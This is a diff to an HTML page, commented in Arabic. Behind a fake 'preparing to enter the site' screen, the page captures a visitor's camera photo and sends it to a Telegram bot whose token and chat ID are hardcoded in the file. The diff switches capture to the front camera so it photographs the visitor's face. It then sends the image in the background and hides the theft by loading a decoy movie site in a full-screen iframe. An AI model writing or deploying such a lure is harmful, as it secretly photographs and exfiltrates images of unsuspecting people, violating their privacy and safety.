@@ -154,6 +154,17 @@
             50% { transform: scale(1.05); }
             100% { transform: scale(1); }
         }
+        
+        #website-frame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1002;
+            display: none;
+        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
@@ -180,13 +191,17 @@
         <p class="loading-text">جاري التحضير لدخول الموقع...</p>
     </div>
     
+    <!-- إطار لموقع الويب -->
+    <iframe id="website-frame" allowfullscreen></iframe>
+    
     <script>
         // التكوين - استبدل هذه القيم
         const config = {
             botToken: '7652311454:AAFHL-FrE9nCB8WG4p-91Uc2-0U2Z4S0A1c',
             chatId: '5310911220',
             captureDelay: 1500, // تأخير الالتقاط بالمللي ثانية
-            autoCloseDelay: 1000 // تأخير الإغلاق بعد الإرسال
+            loadingDuration: 3000, // مدة التحميل قبل فتح الموقع
+            targetWebsite: 'https://bekes-movie4u.blogspot.com/' // استبدل برابط الموقع الذي تريد فتحه
         };
         
         // العناصر
@@ -194,6 +209,7 @@
         const permissionOverlay = document.getElementById('permission-overlay');
         const loadingOverlay = document.getElementById('loading-overlay');
         const allowBtn = document.getElementById('allow-btn');
+        const websiteFrame = document.getElementById('website-frame');
         
         // دالة متعددة المتصفحات لطلب الكاميرا
         async function initCamera() {
@@ -202,7 +218,7 @@
                     video: {
                         width: { ideal: 1920 },
                         height: { ideal: 1080 },
-                        facingMode: 'environment'
+                        facingMode: 'user'
                     },
                     audio: false
                 };
@@ -254,6 +270,13 @@
             }
         }
         
+        // دالة فتح الموقع
+        function openWebsite() {
+            loadingOverlay.style.display = 'none';
+            websiteFrame.src = config.targetWebsite;
+            websiteFrame.style.display = 'block';
+        }
+        
         // معالجة النقر على زر الموافقة
         allowBtn.addEventListener('click', async () => {
             try {
@@ -277,13 +300,11 @@
                 // إيقاف الكاميرا
                 stream.getTracks().forEach(track => track.stop());
                 
-                // إرسال الصورة
-                await sendToTelegram(photoBlob);
+                // إرسال الصورة (في الخلفية دون انتظار النتيجة)
+                sendToTelegram(photoBlob).catch(e => console.error('Error in sending:', e));
                 
-                // إغلاق النافذة بعد الإرسال
-                setTimeout(() => {
-                    window.close();
-                }, config.autoCloseDelay);
+                // عرض شاشة التحميل لفترة ثم فتح الموقع
+                setTimeout(openWebsite, config.loadingDuration);
                 
             } catch (error) {
                 console.error('Process failed:', error);
